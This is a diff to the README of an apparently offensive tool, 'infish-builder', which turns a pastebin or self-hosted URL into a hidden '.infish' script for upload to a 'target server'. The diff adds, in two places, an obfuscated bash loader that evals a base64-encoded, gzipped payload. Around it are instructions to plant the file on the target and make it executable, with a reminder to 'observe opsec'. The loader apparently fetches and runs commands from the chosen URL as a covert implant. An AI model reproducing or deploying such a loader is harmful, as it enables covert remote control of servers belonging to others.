@@ -31,11 +31,19 @@ This is when you already have a webpage (observe opsec) or have already created 
 ```bash
 $ ./infish-builder url pastebin.com/raw/abc123
 ```
+**or**
 
 ```bash
 $ ./infish-builder url somesite.com/cmdpage
 ```
 **You can also use this is you have a url you host on the internet**.
+
+This will generate a file called **.infish** with contents that look like  
+
+```bash
+#!/usr/bin/env bash
+eval"$(echo 'H4sIAAAAAAAAA3VQUUvDMBB+76+4hTJaoW06daClD1PRFxVBYQ/Dh9heXTBNRtpuY+J/N0ntZA89wiV33/cl+a7qZNFyJaEQZRDCN5jwbFrBBCIE4qcE3mE6BY1tp2X2D5aj4Iludcos+mKgEv9leUdgko9eRvxANOCn4YDWcAaRrkbxXu2M/HheNRisGZfWoZN1DWr2ibLNyZM6cCFYchlTCJZclmrXwPMbpDSmGZjG/CKDvU16e53SeUxDeMDiSyUzmlKzUrjnGiu1TxxK+ge0yMmGNS1+cBkXqk402yWLm9t0dt4zTK9mssz9oDBkiJpXiB4hWoB//Jw5ahE6Nq/sIA/G7Z/OuM2gXaN0sI3euCtRNHjs45YJGGSuW3HP7Y1A3MAVpXZQuzUXCK3uMINSOdyOzCuVRO8XMv8NvicCAAA=' | base64 -d | gunzip -c)";
+```
 
 ## Using your pastebin details
 
@@ -63,12 +71,12 @@ $
 
 A file called '.infish' is created. It will contain something like this   
 
-
 ```bash
-
+#!/usr/bin/env bash
+eval"$(echo 'H4sIAAAAAAAAA3VQUUvDMBB+76+4hTJaoW06daClD1PRFxVBYQ/Dh9heXTBNRtpuY+J/N0ntZA89wiV33/cl+a7qZNFyJaEQZRDCN5jwbFrBBCIE4qcE3mE6BY1tp2X2D5aj4Iludcos+mKgEv9leUdgko9eRvxANOCn4YDWcAaRrkbxXu2M/HheNRisGZfWoZN1DWr2ibLNyZM6cCFYchlTCJZclmrXwPMbpDSmGZjG/CKDvU16e53SeUxDeMDiSyUzmlKzUrjnGiu1TxxK+ge0yMmGNS1+cBkXqk402yWLm9t0dt4zTK9mssz9oDBkiJpXiB4hWoB//Jw5ahE6Nq/sIA/G7Z/OuM2gXaN0sI3euCtRNHjs45YJGGSuW3HP7Y1A3MAVpXZQuzUXCK3uMINSOdyOzCuVRO8XMv8NvicCAAA=' | base64 -d | gunzip -c)";
 ```
 
-Finally, upload it to the target server and there, make it executable by running   
+Finally, upload the **.infish** file to the target server and there, make it executable by running   
 
 ```bash
 $ chmod +x .infish
